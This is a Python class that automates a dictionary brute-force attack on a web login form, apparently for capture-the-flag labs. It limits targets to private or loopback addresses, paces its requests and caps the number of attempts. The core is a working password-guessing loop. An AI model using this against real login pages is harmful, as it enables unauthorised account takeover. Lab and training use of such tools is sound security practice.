import ipaddress
import requests
import threading
import time

class CTFTester:
    def __init__(self, config, log_callback, progress_callback, complete_callback):
        self.config = config
        self.log_callback = log_callback
        self.progress_callback = progress_callback
        self.complete_callback = complete_callback
        
        self.is_running = False
        self.thread = None

    @staticmethod
    def validate_target_ip(ip_str):
        clean_ip = ip_str.strip().lower()
        if clean_ip in ('localhost', '127.0.0.1', '::1', '0.0.0.0'):
            return True
        try:
            ip = ipaddress.ip_address(clean_ip)
            return ip.is_private or ip.is_loopback
        except ValueError:
            return False

    def start(self):
        if self.is_running:
            return
        self.is_running = True
        self.thread = threading.Thread(target=self._run_test, daemon=True)
        self.thread.start()

    def stop(self):
        self.is_running = False

    def _run_test(self):
        target_ip = self.config.get('ip', '').strip()
        port = self.config.get('port', 5000)
        login_path = self.config.get('path', '/login').strip()
        username = self.config.get('username', 'admin').strip()
        wordlist_path = self.config.get('wordlist', '')
        delay = self.config.get('delay', 0.5)
        max_attempts = self.config.get('max_attempts', 1000)

        if not self.validate_target_ip(target_ip):
            self.log_callback(f"[!] ERROR: Target IP '{target_ip}' rejected. Only localhost and private RFC1918 IPs are permitted.")
            self.complete_callback(False, "Aborted: Invalid/Public IP")
            self.is_running = False
            return

        if not login_path.startswith('/'):
            login_path = '/' + login_path

        url = f"http://{target_ip}:{port}{login_path}"

        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log_callback(f"[!] ERROR: Could not read wordlist file: {e}")
            self.complete_callback(False, "Aborted: Wordlist Error")
            self.is_running = False
            return

        total_passwords = len(passwords)
        if total_passwords == 0:
            self.log_callback("[!] ERROR: Wordlist is empty.")
            self.complete_callback(False, "Aborted: Empty Wordlist")
            self.is_running = False
            return

        self.log_callback(f"[*] Initializing test against target: {url}")
        self.log_callback(f"[*] Target User: {username} | Loaded passwords: {total_passwords}")
        self.log_callback(f"[*] Safety check passed: Private network target verified.")
        self.log_callback("-" * 50)

        attempts = 0
        success = False

        session = requests.Session()

        for idx, pwd in enumerate(passwords):
            if not self.is_running:
                self.log_callback("[*] Testing stopped by user.")
                break

            if attempts >= max_attempts:
                self.log_callback(f"[!] Maximum attempt limit ({max_attempts}) reached. Stopping.")
                break

            attempts += 1
            self.progress_callback(attempts, total_passwords, pwd)
            self.log_callback(f"[->] Trying [{attempts}/{total_passwords}] Password: {pwd}")

            try:
                payload = {
                    "username": username,
                    "password": pwd
                }
                response = session.post(url, data=payload, allow_redirects=True, timeout=3.0)
                content_lower = response.text.lower()
                is_success = False

                if response.status_code in (200, 302):
                    if any(keyword in content_lower for keyword in ["flag{", "welcome", "dashboard", "congratulations", "success", "logout"]):
                        if not any(err in content_lower for err in ["invalid", "incorrect", "failed", "wrong"]):
                            is_success = True

                if is_success:
                    success = True
                    self.log_callback("\n" + "="*50)
                    self.log_callback("[+] SUCCESS! Valid Credentials Found!")
                    self.log_callback(f"    Target IP : {target_ip}:{port}")
                    self.log_callback(f"    Username  : {username}")
                    self.log_callback(f"    Password  : {pwd}")
                    self.log_callback(f"    Attempts  : {attempts}")
                    self.log_callback("="*50 + "\n")
                    break

            except requests.exceptions.ConnectionError:
                self.log_callback(f"[!] Connection failed to {url}. Is the lab running?")
                time.sleep(1.0)
            except requests.exceptions.Timeout:
                self.log_callback(f"[!] Request timed out for password: {pwd}")
            except Exception as e:
                self.log_callback(f"[!] Error during request: {e}")

            if delay > 0:
                time.sleep(delay)

        status_msg = "Completed: Success" if success else ("Stopped" if not self.is_running else "Completed: No Match Found")
        self.complete_callback(success, status_msg)
        self.is_running = False
